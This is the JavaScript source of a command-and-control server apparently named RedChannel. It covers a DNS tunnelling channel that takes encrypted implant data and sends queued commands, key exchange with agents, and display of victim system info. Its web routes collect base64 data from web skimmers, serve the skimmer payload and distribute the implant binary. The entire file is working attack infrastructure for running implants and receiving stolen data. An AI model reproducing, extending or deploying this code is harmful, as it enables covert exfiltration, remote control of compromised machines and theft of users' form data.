const RC_VERSION = "0.3.0";

// move these to config?
const FLOOD_PROTECTION_TIMEOUT = 10;
const EXPECTED_DATA_SEGMENTS = 5;

const chalk = require("chalk");
const dnsd = require("dnsd");
const util = require("util");
const fs = require("fs");

const Crypto = require("./lib/crypto.js");
const crypto = new Crypto();

const RedChannel = require("./lib/redchannel.js");
const rc = new RedChannel(c2_message_handler);

const RedChannelUI = require("./lib/ui.js");
const ui = new RedChannelUI(rc, crypto);
rc.ui = ui;

const cli = require("commander");
cli.version(RC_VERSION, "-v, --version")
    .usage("[options]")
    .option("-c, --config <path/to/rc.conf>", "specify a redchannel config file", rc.config_file)
    .option("-p, --password <password>", "specify the password or set via env:RC_PASSWORD")
    .option("-c, --c2-domain <domain>", "specify the c2 domain", "")
    .option("-B, --ip [ip]", "bind dns c2 to ip", "")
    .option("-P, --port [port]", "listen for dns on a specific port", "")
    .option("-W, --web-ip [ip]", "bind web server to ip", "")
    .option("-Y, --web-port [port]", "listen for web on a specific port", "")
    .option("-I, --agent-interval [ms]", "check in interval for the agent", "")
    .option("-R, --agent-resolver [ip:port]", "set the resolver to use for the agent", "")
    .option("-d, --debug", "enable debug", false)

    .parse(process.argv);

rc.config_file = cli.config;

const banner = `
██████╗ ███████╗██████╗  ██████╗██╗  ██╗ █████╗ ███╗   ██╗███╗   ██╗███████╗██╗     
██╔══██╗██╔════╝██╔══██╗██╔════╝██║  ██║██╔══██╗████╗  ██║████╗  ██║██╔════╝██║     
██████╔╝█████╗  ██║  ██║██║     ███████║███████║██╔██╗ ██║██╔██╗ ██║█████╗  ██║     
██╔══██╗██╔══╝  ██║  ██║██║     ██╔══██║██╔══██║██║╚██╗██║██║╚██╗██║██╔══╝  ██║     
██║  ██║███████╗██████╔╝╚██████╗██║  ██║██║  ██║██║ ╚████║██║ ╚████║███████╗███████╗
╚═╝  ╚═╝╚══════╝╚═════╝  ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚══════╝
`;
ui.msg(chalk.redBright(banner));

// read config file and merge with defaults to ensure properties exist
const merge = require("lodash.merge");
try {
    var config_data = JSON.parse(fs.readFileSync(rc.config_file).toString());
    rc.config = merge(rc.config, config_data);
} catch (err) {
    ui.error(`cannot read configuration file: ${rc.config_file}, err: ${err.toString()}`);
    process.exit(1);
}

// env password takes priority over commandline
if (process.env.RC_PASSWORD && process.env.RC_PASSWORD.length > 0) {
    ui.info("using master password from environment variable");
    rc.config.c2.plaintext_password = process.env.RC_PASSWORD;
    rc.master_password = crypto.libcrypto.createHash("md5").update(process.env.RC_PASSWORD).digest("hex");
} else if (cli.password && cli.password.length > 0) {
    ui.info("using master password from cli");
    rc.config.c2.plaintext_password = cli.password;
    rc.master_password = crypto.libcrypto.createHash("md5").update(cli.password).digest("hex");
} else {
    ui.error("please specify a master c2 password via command-lie or environment variable, see '--help'");
    process.exit(1);
}

rc.config.c2.domain = cli.c2Domain.length > 0 ? cli.c2Domain : rc.config.c2.domain;
if (rc.config.c2.domain.length == 0) {
    ui.error("please specify the c2 domain via cli or config file, see '--help'");
    process.exit(1);
}

/**
 optional arguments, default values set by commander ^
 */
if (cli.ip != "") rc.config.c2.dns_ip = cli.ip;
if (cli.port != "") rc.config.c2.dns_port = cli.port;
if (cli.webIp != "") rc.config.c2.web_ip = cli.webIp;
if (cli.webPort != "") rc.config.c2.web_port = cli.webPort;
if (cli.agentInterval != "") rc.config.implant.interval = cli.agentInterval;
if (cli.agentResolver != "") rc.config.implant.resolver = cli.agentResolver;

rc.config.debug = cli.debug;
ui.debug(`loaded redchannel config: ${JSON.stringify(rc.config)}`);
/**
 UI
 */

/**
 Web channel
 */
const web_server = require("express")();

web_server.listen(rc.config.c2.web_port, rc.config.c2.web_ip, (err) => {
    if (err) return ui.error(`failed to start web server: ${err}`);
    ui.info(`c2-web listening on: ${rc.config.c2.web_ip}:${rc.config.c2.web_port}`);
});

/**
 Skimmer routes
 */

// incoming skimmer data
web_server.get(rc.config.skimmer.data_route, (request, response) => {
    ui.debug(`incoming skimmer raw data: ${JSON.stringify(request.query)}`);

    data = Buffer.from(request.query.id, "base64").toString();
    ui.success(`incoming skimmer data: \n ${data}`);
    response.send("OK");
});

// server skimmer payload
web_server.get(rc.config.skimmer.payload_route, (request, response) => {
    let ip = request.headers["x-forwarded-for"] || request.socket.remoteAddress;
    ui.warn(`incoming request for skimmer payload from ${ip}`);
    response.send(rc.modules.skimmer.payload);
});

// agent binary payload
web_server.get(rc.config.c2.binary_route, (request, response) => {
    let ip = request.headers["x-forwarded-for"] || request.socket.remoteAddress;
    ui.warn(`incoming request for agent binary from ${ip}`);
    try {
        if (!fs.existsSync(rc.config.implant.output_file)) throw new Error(`agent binary not found on disk, did you generate an implant?`);
        response.sendFile(rc.config.implant.output_file);
        ui.warn(`agent binary sent to ${ip}`);
    } catch (e) {
        ui.error(`agent binary not sent to ${ip}, err: ${e.message}`);
        response.status(404).send("404 File Not Found");
    }
});

/**
 DNS channel
 */
const dns_server = dnsd.createServer(c2_message_handler);
// prettier-ignore
dns_server
    .zone(
        rc.config.c2.domain,
        "ns1." + rc.config.c2.domain,
        "root@" + rc.config.c2.domain,
        "now",
        "2h",
        "30m",
        "2w",
        "10m"
    )
    .listen(rc.config.c2.dns_port, rc.config.c2.dns_ip);

ui.info(`c2-dns listening on: ${rc.config.c2.dns_ip}:${rc.config.c2.dns_port}`);

/**
 req: {
      connection: {
          remoteAddress: '127.0.0.1',
          type: 'AAAA'
      }
 }
 res: {
      question[0]: {
          type: 'AAAA',
          name: 'dns.query.tld'
      },
      answer: [],
      end: function(){}
 }
 */
function c2_message_handler(req, res) {
    var question = res.question[0];
    var hostname = question.name;
    var ttl = 300; // Math.floor(Math.random() 3600)

    if (typeof rc.config.static_dns[hostname] != "undefined") {
        ui.info(`static_dns: responding request for host: '${hostname}' with ip '${rc.config.static_dns[hostname]}'`);
        res.answer.push({
            name: hostname,
            type: "A",
            data: rc.config.static_dns[hostname],
            ttl: ttl,
        });
        res.end();
        return;
    }

    if (!hostname.endsWith(rc.config.c2.domain)) {
        ui.debug(`unknown c2 domain, ignoring query for: ${hostname}`);
        res.end();
        return;
    }
    ui.debug(util.format("c2: %s:%s %s %s", req.connection.remoteAddress, req.connection.type, question.type, question.name));

    if (question.type !== "AAAA" && question.type !== "PROXY") {
        ui.debug(util.format("c2: ignoring non-AAAA/non-PROXY query %s:%s %s %s", req.connection.remoteAddress, req.connection.type, question.type, question.name));
        res.end();
        return;
    }

    var segments = hostname.slice(0, hostname.length - rc.config.c2.domain.length).split(".");
    if (segments.length < EXPECTED_DATA_SEGMENTS) {
        ui.error(util.format("c2: invalid message, not enough data segments (%d, expected %d): %s", segments.length, EXPECTED_DATA_SEGMENTS, hostname));

        res.end();
        return;
    }

    // used to prevent flooding
    var rand_id = segments[0];

    var agent_id = segments[1];
    if (rc.agents[agent_id] == null) {
        rc.init_agent(agent_id);
        ui.warn(`c2: first ping from agent ${chalk.blue(agent_id)}@${req.connection.remoteAddress}`);

        if (!crypto.key) crypto.generate_keys();

        ui.warn(`c2: keyx started with agent ${chalk.blue(agent_id)}`);
        rc.command_keyx(crypto.export_pubkey("uncompressed"), agent_id);
    }
    rc.agents[agent_id].lastseen = Math.floor(new Date() / 1000);
    rc.agents[agent_id].ip = req.connection.remoteAddress;

    var command = 0;
    try {
        command = parseInt(segments[2].slice(0, 2), 16);
    } catch (ex) {
        ui.error(`c2: failed to parse command: ${ex.toString()}`);

        res.end();
        return;
    }

    // no need to check the incoming data, just send a queued up msg
    if (command == rc.AGENT_CHECKIN) {
        if (rc.agents[agent_id].sendq.length == 0) {
            // 03 means no data to send
            ui.debug(`${agent_id} checking in, no data to send`);
            status = rc.make_ip_string("03");
            res.answer.push({
                name: hostname,
                type: "AAAA",
                data: status,
                ttl: ttl,
            });

            res.end();
            return;
        }

        // we have already responded to this agent and rand_id combination
        // reset the flood protection timeout
        if (rc.agents[agent_id].ignore[rand_id]) {
            clearTimeout(rc.agents[agent_id].ignore[rand_id]);
            rc.agents[agent_id].ignore[rand_id] = setTimeout(function () {
                delete rc.agents[agent_id].ignore[rand_id];
            }, FLOOD_PROTECTION_TIMEOUT);

            ui.warn(`c2: ignoring flood from agent: ${chalk.blue(agent_id)}, rid: ${rand_id}, command: ${command}`);

            res.end();
            return;
        }

        ui.debug(`agent ${chalk.blue(agent_id)} checking in, sending next queued command`);
        records = rc.agents[agent_id].sendq.shift();
        records.forEach((r) => {
            res.answer.push({
                name: hostname,
                type: "AAAA",
                data: r,
                ttl: ttl,
            });
        });

        // flood protection, if the agent dns resolver retries a query, data can be lost
        rc.agents[agent_id].ignore[rand_id] = setTimeout(function () {
            delete rc.agents[agent_id].ignore[rand_id];
        }, FLOOD_PROTECTION_TIMEOUT);

        res.end();
        return;
    }

    var current_chunk = 0;
    var total_chunks = 0;
    try {
        current_chunk = parseInt(segments[2].slice(2, 4), 16);
        total_chunks = parseInt(segments[2].slice(4, 6), 16);
    } catch (ex) {
        return ui.error(`c2: invalid chunk numbers, current: ${current_chunk}, total: ${total_chunks}`);
    }

    var data_id = segments[3];
    if (data_id.length < 2) return ui.error(`c2: invalid data id: ${data_id}`);

    var chunk = segments[4];
    if (chunk.length < 2) return ui.error(`c2: invalid chunk: ${chunk}`);

    if (typeof rc.agents[agent_id].recvq[command] == "undefined") {
        rc.agents[agent_id].recvq[command] = {};
    }
    if (typeof rc.agents[agent_id].recvq[command][data_id] == "undefined") {
        rc.agents[agent_id].recvq[command][data_id] = {
            chunks: [],
            data: "",
        };
    }

    rc.agents[agent_id].recvq[command][data_id]["chunks"][current_chunk] = chunk;
    if (rc.count_data_chunks(rc.agents[agent_id].recvq[command][data_id]["chunks"]) == total_chunks) {
        data_to_process = rc.agents[agent_id].recvq[command][data_id]["chunks"].join("");
        delete rc.agents[agent_id].recvq[command][data_id];

        // process data, send back status (0f = failed, 02 = success)
        status = process_dns_data(agent_id, command, data_to_process);
        if (status) {
            res.answer.push({
                name: hostname,
                type: "AAAA",
                data: status,
                ttl: ttl,
            });
        }

        res.end();
        return;
    }

    // last byte 01 indicates more data is expected
    status = rc.make_ip_string("01");
    res.answer.push({
        name: hostname,
        type: "AAAA",
        data: status,
        ttl: ttl,
    });

    /*if (question.type == 'CNAME') {
        res.answer.push({ name: hostname, type: 'CNAME', data: "x.domain.tld", 'ttl': ttl })
    }
    if (question.type == 'A') {
        res.answer.push({ name: hostname, type: 'A', data: "1.1.1." + length, 'ttl': ttl })
    }*/
    res.end();
    return;
}

/**
 Process decoded DNS data and respond
 @param {*} agent_id
 @param {*} command
 @param {*} data
 @returns Object immediate response over dns (success, more data, error)
 */
function process_dns_data(agent_id, command, data) {
    // default success status, 02 means data was received and processed successfully
    var status = rc.make_ip_string("02");
    switch (command) {
        case rc.AGENT_KEYX:
            if (!rc.agents[agent_id].allow_keyx) {
                ui.error(`incoming keyx from ${chalk.blue(agent_id)} not allowed, initiate keyx first`);
                break;
            }

            if (!crypto.key) crypto.generate_keys();

            agent_pubkey = Buffer.from(data, "hex");
            try {
                rc.agents[agent_id].keyx = crypto.import_uncompressed_pubkey(agent_pubkey);
            } catch (ex) {
                ui.error(`cannot import key for ${chalk.blue(agent_id)}: ${ex.toString()}`);
                break;
            }
            ui.success(`agent(${chalk.blue(agent_id)}) keyx: ${rc.agents[agent_id].keyx.asPublicECKey().toString("spki")}`);

            try {
                rc.agents[agent_id].secret = crypto.derive_secret(rc.agents[agent_id].keyx, rc.master_password);
            } catch (ex) {
                ui.error(`cannot derive secret for ${chalk.blue(agent_id)}: ${ex.toString()}`);
                break;
            }
            ui.success(`agent(${chalk.blue(agent_id)}) secret: ${rc.agents[agent_id].secret.toString("hex")}`);

            // if there are no more queued up keyx's, ignore further keyxs from agent
            if (!rc.is_command_in_sendq(agent_id, rc.AGENT_KEYX)) rc.agents[agent_id].allow_keyx = false;
            break;
        case rc.AGENT_MSG:
            try {
                plaintext = decrypt_dns_message(agent_id, data);
            } catch (ex) {
                ui.error(`cannot decrypt message from ${chalk.blue(agent_id)}: ${ex.toString()}`);
                break;
            }
            ui.success(`agent(${chalk.blue(agent_id)}) output>\n ${plaintext.toString()}`);
            break;
        case rc.AGENT_SYSINFO:
            try {
                plaintext = decrypt_dns_message(agent_id, data);
            } catch (ex) {
                ui.error(`cannot decrypt message from ${chalk.blue(agent_id)}: ${ex.toString()}`);
                break;
            }

            sysinfo = plaintext.toString().split(";");
            userinfo = sysinfo[2].split(":");
            rows = [
                [chalk.yellowBright("hostname"), chalk.gray(sysinfo[0])],
                [chalk.yellowBright("ips"), chalk.gray(sysinfo[1])],
                [chalk.yellowBright("user"), chalk.gray(userinfo[0])],
                [chalk.yellowBright("uid"), chalk.gray(userinfo[1])],
                [chalk.yellowBright("gid"), chalk.gray(userinfo[2])],
            ];

            ui.success(`agent(${chalk.blue(agent_id)}) sysinfo>`);
            ui.display_table([], rows);
            break;
    }
    return status;
}

function decrypt_dns_message(agent_id, data) {
    if (!agent_id) throw new Error("invalid agent id");
    if (!data) throw new Error("invalid data");
    if (!rc.agents[agent_id].keyx) throw new Error("missing keyx");

    buffer = Buffer.from(data, "hex");
    iv = buffer.slice(0, crypto.BLOCK_LENGTH);
    ciphertext = buffer.slice(crypto.BLOCK_LENGTH);

    // may throw errors
    plaintext = crypto.aes_decrypt(ciphertext, rc.agents[agent_id].secret, iv);
    return plaintext;
}
